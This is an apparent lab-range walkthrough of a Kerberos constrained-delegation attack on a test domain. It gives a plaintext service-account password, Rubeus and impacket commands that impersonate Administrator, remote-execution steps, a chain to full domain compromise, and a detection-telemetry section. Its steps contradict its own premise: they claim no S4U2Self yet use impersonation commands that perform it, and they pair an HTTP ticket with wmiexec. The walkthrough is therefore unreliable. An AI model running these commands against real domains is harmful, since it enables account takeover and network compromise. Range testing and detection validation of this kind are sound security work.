# WT#006 — Constrained Delegation w/o Protocol Transition

## Metadata
| Field | Value |
|-------|-------|
| **Target VM** | 192.168.77.23 (mbr02) |
| **Domain** | range.local |
| **Starting Credential** | svc_sccm / s3rv1c3_SCCM! |
| **Tools Required** | Rubeus, impacket-getST, impacket-wmiexec |
| **Certifications** | CRTE |
| **MITRE ATT&CK** | T1550.003 |
| **Difficulty** | Hard |

## Prerequisites
- svc_sccm compromised (from WT#002 cross-forest Kerberoast or WT#033)
- svc_sccm `msDS-AllowedToDelegateTo`: `HTTP/mbr02.range.local`
- svc_sccm does NOT have `TrustedToAuthForDelegation` (no protocol transition)

## Attack Steps

### Step 1 — Authenticate as svc_sccm and obtain TGT
```bash
# Request TGT as svc_sccm from kali using the Kerberos password/auth
impacket-getTGT 'RANGE/svc_sccm:s3rv1c3_SCCM!' -dc-ip 192.168.77.12
export KRB5CCNAME=/tmp/svc_sccm.ccache
```

### Step 2 — S4U2Proxy (without S4U2Self — no protocol transition)
```bash
# Since protocol transition is NOT allowed, we need an existing
# network authentication from the target user to the delegate.
# With only S4U2Proxy (not S4U2Self), we need a TGS from a real
# Kerberos authentication first.

# Option A: If we can coerce Administrator to auth to mbr02
# (via printerbug, DFSCoerce), we then use S4U2Proxy:

# From a Windows machine as svc_sccm, after coercion triggered:
Rubeus.exe s4u /user:svc_sccm /rc4:<svc_sccm_ntlm> /impersonateuser:Administrator /domain:range.local /msdsspn:HTTP/mbr02.range.local /altservice:cifs /dc:dc03.range.local /ptt

# Option B: Use impacket with existing TGT and known password
impacket-getST -spn HTTP/mbr02.range.local -impersonate Administrator -dc-ip 192.168.77.12 'RANGE/svc_sccm:s3rv1c3_SCCM!'
```

### Step 3 — Use the delegated HTTP service ticket
```bash
export KRB5CCNAME=/tmp/administrator.ccache

# Access mbr02 via delegated HTTP service
# HTTP/mbr02 may allow WinRM access
impacket-wmiexec -no-pass -k administrator@mbr02.range.local
```

## Post-Exploitation Chain
WT#006 → SYSTEM on mbr02 → SCCM admin → TAKEOVER-1 (Site Server to DA) → full range.local compromise

## Telemetry Verification
- **Elastic Index:** `logs-system.security-*`, `logs-windows.powershell-*`
- **Expected Events:**
  - Event ID 4624: Kerberos service ticket logon (svc_sccm)
  - Event ID 4672: Special privileges assigned to new logon
  - Event ID 4769: Kerberos service ticket requested (HTTP/mbr02.range.local)
  - Sysmon EID 1: Rubeus.exe process creation
- **Zeek:** `kerberos.log` showing TGS-REQ with cname=Administrator, sname=HTTP/mbr02.range.local, no preauth flag for protocol transition
- **Detection nuance:** S4U2Proxy without S4U2Self produces FORWARDED ticket flag in Kerberos without the OK-AS-DELEGATE flag — a distinct fingerprint

## Status
CONFIGURED
